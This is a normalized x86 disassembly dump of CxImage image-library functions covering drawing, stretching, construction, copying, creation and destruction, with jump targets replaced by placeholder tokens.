mov edx [ ebp - 0xec ]
mov eax [ ebp - 0xf0 ]
mov ecx [ edx ]
cmp ecx [ eax ]
jne r-xdata
mov eax [ ebp - 0x154 ]
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x28 ] 0x0
je r-xdata
mov edx [ ebp - 0x94 ]
add edx 0x1
mov [ ebp - 0x94 ] edx
mov edx [ ebp - 0x80 ]
mov al [ ebp - 0x4c ]
mov [ edx ] al
mov ecx [ ebp - 0x80 ]
add ecx 0x1
mov [ ebp - 0x80 ] ecx
mov edx [ ebp - 0x80 ]
mov al [ ebp - 0x4b ]
mov [ edx ] al
mov ecx [ ebp - 0x80 ]
add ecx 0x1
mov [ ebp - 0x80 ] ecx
mov edx [ ebp - 0x80 ]
mov al [ ebp - 0x4a ]
mov [ edx ] al
mov ecx [ ebp - 0x80 ]
add ecx 0x1
mov [ ebp - 0x80 ] ecx
jmp r-xdata
mov eax [ ebp - 0x12c ]
add eax 0x3
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x154 ]
and ecx 0xff
cmp ecx 0xff
jne r-xdata
mov eax [ ebp - 0x12c ]
add eax 0x3
mov [ ebp - 0x12c ] eax
jmp r-xdata
mov ecx [ ebp - 0x12c ]
add ecx 0x3
mov [ ebp - 0x12c ] ecx
mov edx [ ebp - 0x154 ]
and edx 0xff
cmp edx 0xff
jne r-xdata
mov ecx [ ebp - 0x12c ]
add ecx 0x3
mov [ ebp - 0x12c ] ecx
jmp r-xdata
mov edx [ ebp - 0x140 ]
add edx 0x1
mov [ ebp - 0x140 ] edx
mov edx [ ebp - 0x154 ]
and edx 0xff
not edx
mov [ ebp - 0x158 ] dl
mov eax [ ebp - 0x12c ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x158 ]
and edx 0xff
imul ecx edx
mov eax [ ebp - 0x154 ]
and eax 0xff
mov edx [ ebp - 0xe4 ]
and edx 0xff
imul eax edx
add ecx eax
sar ecx 0x8
mov eax [ ebp - 0x12c ]
mov [ eax ] cl
mov ecx [ ebp - 0x12c ]
add ecx 0x1
mov [ ebp - 0x12c ] ecx
mov edx [ ebp - 0x12c ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x158 ]
and ecx 0xff
imul eax ecx
mov edx [ ebp - 0x154 ]
and edx 0xff
mov ecx [ ebp - 0xe3 ]
and ecx 0xff
imul edx ecx
add eax edx
sar eax 0x8
mov edx [ ebp - 0x12c ]
mov [ edx ] al
mov eax [ ebp - 0x12c ]
add eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x158 ]
and eax 0xff
imul edx eax
mov ecx [ ebp - 0x154 ]
and ecx 0xff
mov eax [ ebp - 0xe2 ]
and eax 0xff
imul ecx eax
add edx ecx
sar edx 0x8
mov ecx [ ebp - 0x12c ]
mov [ ecx ] dl
mov edx [ ebp - 0x12c ]
add edx 0x1
mov [ ebp - 0x12c ] edx
mov edx [ ebp - 0x12c ]
mov al [ ebp - 0xe4 ]
mov [ edx ] al
mov ecx [ ebp - 0x12c ]
add ecx 0x1
mov [ ebp - 0x12c ] ecx
mov edx [ ebp - 0x12c ]
mov al [ ebp - 0xe3 ]
mov [ edx ] al
mov ecx [ ebp - 0x12c ]
add ecx 0x1
mov [ ebp - 0x12c ] ecx
mov edx [ ebp - 0x12c ]
mov al [ ebp - 0xe2 ]
mov [ edx ] al
mov ecx [ ebp - 0x12c ]
add ecx 0x1
mov [ ebp - 0x12c ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x140 ]
add ecx 0x1
mov [ ebp - 0x140 ] ecx
mov edx [ ebp - 0x14c ]
add edx 0x1
mov [ ebp - 0x14c ] edx
mov eax [ ebp - 0x154 ]
and eax 0xff
not eax
mov [ ebp - 0x158 ] al
mov ecx [ ebp - 0x12c ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x158 ]
and eax 0xff
imul edx eax
mov ecx [ ebp - 0x154 ]
and ecx 0xff
mov eax [ ebp - 0xe4 ]
and eax 0xff
imul ecx eax
add edx ecx
sar edx 0x8
mov ecx [ ebp - 0x12c ]
mov [ ecx ] dl
mov edx [ ebp - 0x12c ]
add edx 0x1
mov [ ebp - 0x12c ] edx
mov eax [ ebp - 0x12c ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x158 ]
and edx 0xff
imul ecx edx
mov eax [ ebp - 0x154 ]
and eax 0xff
mov edx [ ebp - 0xe3 ]
and edx 0xff
imul eax edx
add ecx eax
sar ecx 0x8
mov eax [ ebp - 0x12c ]
mov [ eax ] cl
mov ecx [ ebp - 0x12c ]
add ecx 0x1
mov [ ebp - 0x12c ] ecx
mov edx [ ebp - 0x12c ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x158 ]
and ecx 0xff
imul eax ecx
mov edx [ ebp - 0x154 ]
and edx 0xff
mov ecx [ ebp - 0xe2 ]
and ecx 0xff
imul edx ecx
add eax edx
sar eax 0x8
mov edx [ ebp - 0x12c ]
mov [ edx ] al
mov eax [ ebp - 0x12c ]
add eax 0x1
mov [ ebp - 0x12c ] eax
mov eax [ ebp - 0x12c ]
mov cl [ ebp - 0xe4 ]
mov [ eax ] cl
mov edx [ ebp - 0x12c ]
add edx 0x1
mov [ ebp - 0x12c ] edx
mov eax [ ebp - 0x12c ]
mov cl [ ebp - 0xe3 ]
mov [ eax ] cl
mov edx [ ebp - 0x12c ]
add edx 0x1
mov [ ebp - 0x12c ] edx
mov eax [ ebp - 0x12c ]
mov cl [ ebp - 0xe2 ]
mov [ eax ] cl
mov edx [ ebp - 0x12c ]
add edx 0x1
mov [ ebp - 0x12c ] edx
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
?Draw2@CxImage@@QAEJPAUHDC__@@JJJJ@Z
push ebp
mov ebp esp
sub esp 0x8c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x8c ]
mov ecx 0x23
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x8c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x14
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x17e ]
test edx edx
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jge r-xdata
cmp [ ebp + 0x18 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp [ ecx + 0x14c ] 0xffffffff
setne dl
mov [ ebp - 0x8 ] dl
mov eax [ ebp - 0x8 ]
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ebp + 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0xc ]
add edx [ ebp + 0x14 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov esi esp
lea ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ RectVisible@IAT ]
cmp esi esp
call _chkesp
test eax eax
je r-xdata
mov esi esp
push 0x3
mov ecx [ ebp + 0x8 ]
push ecx
call [ SetStretchBltMode@IAT ]
cmp esi esp
call _chkesp
mov esi esp
push 0xcc0020
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
push eax
push 0x0
push 0x0
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ StretchDIBits@IAT ]
cmp esi esp
call _chkesp
jmp r-xdata
mov eax 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x24 ] eax
mov esi esp
mov ecx [ ebp + 0x8 ]
push ecx
call [ CreateCompatibleDC@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x28 ] eax
mov esi esp
mov edx [ ebp + 0x8 ]
push edx
call [ CreateCompatibleDC@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x2c ] eax
mov esi esp
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ CreateCompatibleBitmap@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x30 ] eax
mov esi esp
mov eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
call [ SelectObject@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x34 ] eax
mov esi esp
push 0x3
mov edx [ ebp - 0x28 ]
push edx
call [ SetStretchBltMode@IAT ]
cmp esi esp
call _chkesp
mov esi esp
push 0xcc0020
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
push eax
mov ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp - 0x20 ]
push edx
push 0x0
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
push 0x0
push 0x0
mov edx [ ebp - 0x28 ]
push edx
call [ StretchDIBits@IAT ]
cmp esi esp
call _chkesp
mov esi esp
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
call [ CreateBitmap@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x38 ] eax
mov esi esp
mov edx [ ebp - 0x38 ]
push edx
mov eax [ ebp - 0x2c ]
push eax
call [ SelectObject@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dx [ ecx + 0x16 ]
cmp edx 0x18
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x150 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x4 ]
mov cl [ eax + 0x14c ]
push ecx
lea edx [ ebp - 0x4c ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPaletteColor@CxImage@@QAE?AUtagRGBQUAD@@E@Z
mov eax [ eax ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp - 0x3e ]
and eax 0xff
mov ecx [ ebp - 0x3f ]
and ecx 0xff
shl ecx 0x8
or eax ecx
mov edx [ ebp - 0x40 ]
and edx 0xff
shl edx 0x10
or eax edx
mov [ ebp - 0x44 ] eax
mov esi esp
mov eax [ ebp - 0x44 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
call [ SetBkColor@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x48 ] eax
mov esi esp
push 0xcc0020
push 0x0
push 0x0
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
push 0x0
push 0x0
mov edx [ ebp - 0x2c ]
push edx
call [ BitBlt@IAT ]
cmp esi esp
call _chkesp
mov esi esp
push rw-data
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
push 0x0
push 0x0
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ StretchBlt@IAT ]
cmp esi esp
call _chkesp
mov esi esp
push rw-data
mov edx [ ebp - 0x24 ]
push edx
mov eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x2c ]
push ecx
mov edx [ ebp + 0x18 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ StretchBlt@IAT ]
cmp esi esp
call _chkesp
mov esi esp
push rw-data
mov ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp - 0x20 ]
push edx
push 0x0
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ StretchBlt@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov eax [ ebp - 0x34 ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
call [ SelectObject@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov edx [ ebp - 0x3c ]
push edx
mov eax [ ebp - 0x2c ]
push eax
call [ SelectObject@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov ecx [ ebp - 0x48 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ SetBkColor@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov eax [ ebp - 0x38 ]
push eax
call [ DeleteObject@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov ecx [ ebp - 0x28 ]
push ecx
call [ DeleteDC@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov edx [ ebp - 0x2c ]
push edx
call [ DeleteDC@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov eax [ ebp - 0x30 ]
push eax
call [ DeleteObject@IAT ]
cmp esi esp
call _chkesp
?Stretch@CxImage@@QAEJPAUHDC__@@JJJJK@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov esi esp
push 0x3
mov ecx [ ebp + 0x8 ]
push ecx
call [ SetStretchBltMode@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov edx [ ebp + 0x1c ]
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
push 0x0
push 0x0
mov edx [ ebp + 0x18 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ StretchDIBits@IAT ]
cmp esi esp
call _chkesp
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x18
?Startup@CxImage@@IAEXK@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1a0 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x19c ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1a4 ] 0x0
push 0x28
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x8
push ecx
call memset
add esp 0xc
push 0x16c
push 0x0
mov edx [ ebp - 0x4 ]
add edx 0x30
push edx
call memset
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x40 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x154 ] 0x5a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0xff
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14c ] 0xffffffff
mov edx [ ebp - 0x4 ]
mov [ edx + 0x17e ] 0x1
push 0x60
mov ecx [ ebp - 0x4 ]
call ?SetXDPI@CxImage@@QAEXJ@Z
push 0x60
mov ecx [ ebp - 0x4 ]
call ?SetYDPI@CxImage@@QAEXJ@Z
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??0CxImage@@QAE@K@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] CxImage::`vbtable'
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?Startup@CxImage@@IAEXK@Z
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?Destroy@CxImage@@QAE_NXZ
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x54 ]
mov ecx 0x15
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
xor al al
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x1a4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x1a0 ] 0x0
je r-xdata
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x19c ]
push edx
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x19c ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x194 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov esi esp
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1a0 ]
push eax
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1a0 ] 0x0
mov esi esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1a4 ]
push ecx
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a4 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1a4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov al 0x1
jmp r-xdata
mov esi esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov esi esp
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ecx ]
mov ecx [ ebp - 0xc ]
call [ edx ]
cmp esi esp
call _chkesp
mov [ ebp - 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x54
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
??0CxImage@@QAE@KKKK@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] CxImage::`vbtable'
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?Startup@CxImage@@IAEXK@Z
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?Create@CxImage@@QAEPAXKKKK@Z
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x10
??0CxImage@@QAE@ABV0@_N11@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] CxImage::`vbtable'
mov ecx [ ebp + 0x8 ]
call ?GetType@CxImage@@QBEKXZ
push eax
mov ecx [ ebp - 0x4 ]
call ?Startup@CxImage@@IAEXK@Z
mov cl [ ebp + 0x14 ]
push ecx
mov dl [ ebp + 0x10 ]
push edx
mov al [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?Copy@CxImage@@QAEXABV1@_N11@Z
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x10
?Copy@CxImage@@QAEXABV1@_N11@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
push 0x16c
mov eax [ ebp + 0x8 ]
add eax 0x30
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x30
push ecx
call memcpy
add esp 0xc
mov ecx [ ebp + 0x8 ]
call ?GetType@CxImage@@QBEKXZ
push eax
mov ecx [ ebp + 0x8 ]
call ?GetBpp@CxImage@@QBEGXZ
and eax 0xffff
push eax
mov ecx [ ebp + 0x8 ]
call ?GetHeight@CxImage@@QBEKXZ
push eax
mov ecx [ ebp + 0x8 ]
call ?GetWidth@CxImage@@QBEKXZ
push eax
mov ecx [ ebp - 0x4 ]
call ?Create@CxImage@@QAEPAXKKKK@Z
mov edx [ ebp + 0xc ]
and edx 0xff
test edx edx
je r-xdata
push 0x100
mov ecx [ ebp + 0x8 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
push eax
mov ecx [ ebp - 0x4 ]
call ?SetPalette@CxImage@@QAEXPAUtagRGBQUAD@@K@Z
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
and ecx 0xff
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x19c ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x10
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x1a0 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x19c ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
call ?GetSize@CxImage@@QAEJXZ
push eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
call memcpy
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
mov esi esp
mov edx [ ebp - 0x8 ]
push edx
call [ malloc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x19c ] eax
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x19c ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x19c ]
push eax
call memcpy
add esp 0xc
mov esi esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x19c ]
push ecx
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
imul edx [ ecx + 0x10 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x10 ]
and eax 0xff
test eax eax
je r-xdata
mov esi esp
mov eax [ ebp - 0x8 ]
push eax
call [ malloc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1a0 ] eax
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1a0 ]
push eax
call memcpy
add esp 0xc
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1a0 ]
push edx
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
?CopyInfo@CxImage@@IAEXABV1@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
push 0x16c
mov ecx [ ebp + 0x8 ]
add ecx 0x30
push ecx
mov edx [ ebp - 0x4 ]
add edx 0x30
push edx
call memcpy
add esp 0xc
??4CxImage@@QAEAAV0@ABV0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
push 0x1
push 0x1
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?Copy@CxImage@@QAEXABV1@_N11@Z
?Create@CxImage@@QAEPAXKKKK@Z
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x50 ]
mov ecx 0x14
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call ?Destroy@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
ja r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x4
ja r-xdata
mov [ ebp + 0x10 ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x50
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x8
ja r-xdata
mov [ ebp + 0x10 ] 0x4
jmp r-xdata
mov eax [ ebp + 0x8 ]
imul eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
shr eax 0x8
cmp eax 0xf424000
jbe r-xdata
mov [ ebp + 0x10 ] 0x18
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x1
je r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x44
push ecx
call strcpy
add esp 0x8
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x4
je r-xdata
mov ecx [ ebp + 0x10 ]
imul ecx [ ebp + 0x8 ]
add ecx 0x1f
shr ecx 0x5
shl ecx 0x2
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x40 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x28
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
mov edx [ ebp - 0x4 ]
